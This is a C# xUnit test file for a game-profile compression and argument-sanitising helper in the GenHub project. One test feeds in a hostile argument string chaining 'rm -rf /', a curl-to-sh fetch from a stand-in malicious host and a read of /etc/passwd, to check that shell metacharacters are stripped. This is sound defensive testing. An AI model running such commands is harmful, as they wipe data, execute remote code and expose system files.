using System;
using System.Threading.Tasks;
using GenHub.Core.Helpers;
using Xunit;

namespace GenHub.Tests.Core.Helpers;

/// <summary>
/// Unit tests for <see cref="ProfileSharingCompressionHelper"/>.
/// </summary>
public class ProfileSharingCompressionHelperTests
{
    /// <summary>
    /// Verifies that compression and decompression round-trips correctly.
    /// </summary>
    [Fact]
    public void CompressAndDecompress_Should_Roundtrip_Successfully()
    {
        // Arrange
        var originalText = "{\"name\":\"Generals Online Competitive\",\"gameType\":\"Generals\",\"requiredManifests\":[{\"manifestId\":\"go-client-1.0\"}]}";

        // Act
        var compressed = ProfileSharingCompressionHelper.CompressAndEncode(originalText);
        var decompressed = ProfileSharingCompressionHelper.DecodeAndDecompress(compressed);

        // Assert
        Assert.NotNull(compressed);
        Assert.NotEmpty(compressed);
        Assert.Equal(originalText, decompressed);
    }

    /// <summary>
    /// Verifies that async decompression matches sync decompression.
    /// </summary>
    /// <returns>A task representing the asynchronous test.</returns>
    [Fact]
    public async Task DecodeAndDecompressAsync_Should_Match_SynchronousResultAsync()
    {
        // Arrange
        var originalText = "{\"name\":\"Shockwave Modded Profile\",\"description\":\"Full testing payload with custom parameters\"}";
        var compressed = ProfileSharingCompressionHelper.CompressAndEncode(originalText);

        // Act
        var decompressed = await ProfileSharingCompressionHelper.DecodeAndDecompressAsync(compressed);

        // Assert
        Assert.Equal(originalText, decompressed);
    }

    /// <summary>
    /// Verifies that dangerous command line characters are stripped and reported as security warnings.
    /// </summary>
    [Fact]
    public void SanitizeCommandLineArguments_Should_Strip_DangerousShellCharacters()
    {
        // Arrange
        var dangerousArgs = "-win -quickstart & rm -rf / ; curl http://malicious.com | sh > output.txt `cat /etc/passwd` $ENV";

        // Act
        var sanitized = ProfileSharingCompressionHelper.SanitizeCommandLineArguments(dangerousArgs, out var warnings);

        // Assert
        Assert.DoesNotContain("&", sanitized);
        Assert.DoesNotContain(";", sanitized);
        Assert.DoesNotContain("|", sanitized);
        Assert.DoesNotContain(">", sanitized);
        Assert.DoesNotContain("`", sanitized);
        Assert.DoesNotContain("$", sanitized);
        Assert.Contains("-win -quickstart", sanitized);
        Assert.NotEmpty(warnings);
        Assert.Contains(warnings, w => w.Contains("Disallowed special command characters"));
    }

    /// <summary>
    /// Verifies that safe command line arguments pass through with no warnings.
    /// </summary>
    [Fact]
    public void SanitizeCommandLineArguments_Should_Allow_SafeArguments()
    {
        // Arrange
        var safeArgs = "-win -quickstart -xres 1920 -yres 1080 -scriptDebug";

        // Act
        var sanitized = ProfileSharingCompressionHelper.SanitizeCommandLineArguments(safeArgs, out var warnings);

        // Assert
        Assert.Equal(safeArgs, sanitized);
        Assert.Empty(warnings);
    }

    /// <summary>
    /// Verifies that empty or null arguments produce empty string and no warnings.
    /// </summary>
    /// <param name="input">The input command line string.</param>
    [Theory]
    [InlineData(null)]
    [InlineData("")]
    [InlineData("   ")]
    public void SanitizeCommandLineArguments_Should_Handle_NullOrWhitespace(string? input)
    {
        // Act
        var sanitized = ProfileSharingCompressionHelper.SanitizeCommandLineArguments(input, out var warnings);

        // Assert
        Assert.Equal(string.Empty, sanitized);
        Assert.Empty(warnings);
    }

    /// <summary>
    /// Verifies that invalid Base64 input throws FormatException.
    /// </summary>
    [Fact]
    public void DecodeAndDecompress_Should_Throw_OnInvalidBase64()
    {
        // Arrange
        var invalidInput = "???not_valid_base64_or_brotli???";

        // Act & Assert
        Assert.ThrowsAny<Exception>(() => ProfileSharingCompressionHelper.DecodeAndDecompress(invalidInput));
    }
}
